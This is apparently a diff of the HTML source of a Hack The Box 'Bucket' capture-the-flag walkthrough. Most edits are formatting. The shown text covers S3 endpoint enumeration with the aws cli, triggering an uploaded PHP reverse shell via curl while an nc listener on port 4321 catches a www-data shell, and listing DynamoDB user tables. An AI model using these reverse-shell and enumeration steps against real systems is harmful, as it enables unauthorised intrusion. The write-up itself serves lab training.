@@ -91,6 +91,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </pre></div>
 
 
+<p>Result: </p>
 <div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span>
 <span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>302 Found<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
@@ -119,13 +120,14 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </pre></div>
 
 
+<p>Result:</p>
 <div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
 <span class="nt">&lt;Error&gt;</span>
     <span class="nt">&lt;Code&gt;</span>NoSuchKey<span class="nt">&lt;/Code&gt;</span>
     <span class="nt">&lt;Message&gt;</span>The specified key does not exist.<span class="nt">&lt;/Message&gt;</span>
 
     <span class="nt">&lt;RequestID&gt;</span>7a62c49f-347e-4fc4-9331-6e8eEXAMPLE<span class="nt">&lt;/RequestID&gt;</span>
-<span class="nt">&lt;/Error&gt;</span>┌─[pawel@parrot]─[~]
+<span class="nt">&lt;/Error&gt;</span>
 </pre></div>
 
 
@@ -133,13 +135,17 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </pre></div>
 
 
+<p>Result:</p>
 <div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;running&quot;</span><span class="p">}</span>
 </pre></div>
 
 
 <div class="highlight"><pre><span></span>curl <span class="s2">&quot;http://s3.bucket.htb/&quot;</span>
-<span class="sb">```</span>json
-<span class="sb">```</span><span class="o">{</span><span class="s2">&quot;status&quot;</span>: <span class="s2">&quot;running&quot;</span><span class="o">}</span>
+</pre></div>
+
+
+<p>Result:</p>
+<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;running&quot;</span><span class="p">}</span>
 </pre></div>
 
 
@@ -154,7 +160,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </pre></div>
 
 
-<p>And hey, what we have here!?</p>
+<p>And hey, what we have here?!</p>
 <div class="highlight"><pre><span></span>=====================================================================
 ID           Response   Lines    Word       Chars       Payload                                                                                   
 =====================================================================
@@ -168,7 +174,7 @@ ID           Response   Lines    Word       Chars       Payload
 <p>We are definitly going somewhere. For now just note that discovery.</p>
 <p>For now we can try last, but most important thing: use the <strong>aws</strong> cli. It is already on your system or just install it from system repo.</p>
 <p>Now the param <strong>--endpoint-url</strong> will be crucial. Lets try:</p>
-<div class="highlight"><pre><span></span>aws --endpoint-url=http://s3.bucket.htb s3 ls adserver/
+<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb s3 ls adserver/
 </pre></div>
 
 
@@ -191,22 +197,28 @@ ID           Response   Lines    Word       Chars       Payload
 
 <p>Now we can try to execute it:</p>
 <div class="highlight"><pre><span></span>nc -lvnp <span class="m">4321</span> <span class="c1"># in one term</span>
-<span class="c1"># next that below in another:</span>
-curl http://bucket.htb/php-reverse-shell.php
-<span class="c1"># BOOM, we got the foothold</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4321</span> ...
-connect to <span class="o">[</span><span class="m">10</span>.10.14.11<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span><span class="m">10</span>.10.10.212<span class="o">]</span> <span class="m">54924</span>
-Linux bucket <span class="m">5</span>.4.0-48-generic <span class="c1">#52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
- <span class="m">22</span>:03:15 up  <span class="m">3</span>:08,  <span class="m">1</span> user,  load average: <span class="m">0</span>.01, <span class="m">0</span>.20, <span class="m">0</span>.25
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-roy      pts/1    <span class="m">10</span>.10.14.11      <span class="m">18</span>:59   <span class="m">56</span>.00s  <span class="m">0</span>.44s  <span class="m">0</span>.44s -bash
-<span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
-/bin/sh: <span class="m">0</span>: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
-$ 
 </pre></div>
 
 
-<p>We are inside!</p>
+<p>Next that below in another:</p>
+<div class="highlight"><pre><span></span>curl http://bucket.htb/php-reverse-shell.php
+</pre></div>
+
+
+<p>Then what we see on the <strong>nc</strong> awaiting for connection?</p>
+<div class="highlight"><pre><span></span><span class="nt">listening</span> <span class="nt">on</span> <span class="cp">[</span><span class="nb">any</span><span class="cp">]</span> <span class="nt">4321</span> <span class="o">...</span>
+<span class="nt">connect</span> <span class="nt">to</span> <span class="cp">[</span><span class="mf">10.10.14.11</span><span class="cp">]</span> <span class="nt">from</span> <span class="o">(</span><span class="nt">UNKNOWN</span><span class="o">)</span> <span class="cp">[</span><span class="mf">10.10.10.212</span><span class="cp">]</span> <span class="nt">54924</span>
+<span class="nt">Linux</span> <span class="nt">bucket</span> <span class="nt">5</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">0-48-generic</span> <span class="p">#</span><span class="nn">52-Ubuntu</span> <span class="nt">SMP</span> <span class="nt">Thu</span> <span class="nt">Sep</span> <span class="nt">10</span> <span class="nt">10</span><span class="p">:</span><span class="nd">58</span><span class="p">:</span><span class="nd">49</span> <span class="nt">UTC</span> <span class="nt">2020</span> <span class="nt">x86_64</span> <span class="nt">x86_64</span> <span class="nt">x86_64</span> <span class="nt">GNU</span><span class="o">/</span><span class="nt">Linux</span>
+ <span class="nt">22</span><span class="p">:</span><span class="nd">03</span><span class="p">:</span><span class="nd">15</span> <span class="nt">up</span>  <span class="nt">3</span><span class="p">:</span><span class="nd">08</span><span class="o">,</span>  <span class="nt">1</span> <span class="nt">user</span><span class="o">,</span>  <span class="nt">load</span> <span class="nt">average</span><span class="o">:</span> <span class="nt">0</span><span class="p">.</span><span class="nc">01</span><span class="o">,</span> <span class="nt">0</span><span class="p">.</span><span class="nc">20</span><span class="o">,</span> <span class="nt">0</span><span class="p">.</span><span class="nc">25</span>
+<span class="nt">USER</span>     <span class="nt">TTY</span>      <span class="nt">FROM</span>             <span class="nt">LOGIN</span><span class="o">@</span>   <span class="nt">IDLE</span>   <span class="nt">JCPU</span>   <span class="nt">PCPU</span> <span class="nt">WHAT</span>
+<span class="nt">roy</span>      <span class="nt">pts</span><span class="o">/</span><span class="nt">1</span>    <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">14</span><span class="p">.</span><span class="nc">11</span>      <span class="nt">18</span><span class="p">:</span><span class="nd">59</span>   <span class="nt">56</span><span class="p">.</span><span class="nc">00s</span>  <span class="nt">0</span><span class="p">.</span><span class="nc">44s</span>  <span class="nt">0</span><span class="p">.</span><span class="nc">44s</span> <span class="nt">-bash</span>
+<span class="nt">uid</span><span class="o">=</span><span class="nt">33</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span> <span class="nt">gid</span><span class="o">=</span><span class="nt">33</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span> <span class="nt">groups</span><span class="o">=</span><span class="nt">33</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span>
+<span class="o">/</span><span class="nt">bin</span><span class="o">/</span><span class="nt">sh</span><span class="o">:</span> <span class="nt">0</span><span class="o">:</span> <span class="nt">can</span><span class="err">&#39;</span><span class="nt">t</span> <span class="nt">access</span> <span class="nt">tty</span><span class="o">;</span> <span class="nt">job</span> <span class="nt">control</span> <span class="nt">turned</span> <span class="nt">off</span>
+<span class="o">$</span> 
+</pre></div>
+
+
+<p>BOOM, we are inside!</p>
 <h1>User</h1>
 <p>Escalating privileges in this case is quite simple, but we have to combine something new to find, with some foothold info. And with some luck, if it was a real life scenario.</p>
 <p>Of course it is recomended to start some enumaration scripts in this moment. Like <em>LinEnum</em> or <em>linpeas</em> and I encourage you to do it. But lets jump straight to the solution.</p>
@@ -227,6 +239,7 @@ cat: user.txt: Permission denied
 </pre></div>
 
 
+<p>Result:</p>
 <div class="highlight"><pre><span></span><span class="p">{</span>
     <span class="nt">&quot;TableNames&quot;</span><span class="p">:</span> <span class="p">[</span>
         <span class="s2">&quot;users&quot;</span>
@@ -239,6 +252,7 @@ cat: user.txt: Permission denied
 </pre></div>
 
 
+<p>Result:</p>
 <div class="highlight"><pre><span></span><span class="p">{</span>
     <span class="nt">&quot;Items&quot;</span><span class="p">:</span> <span class="p">[</span>
         <span class="p">{</span>
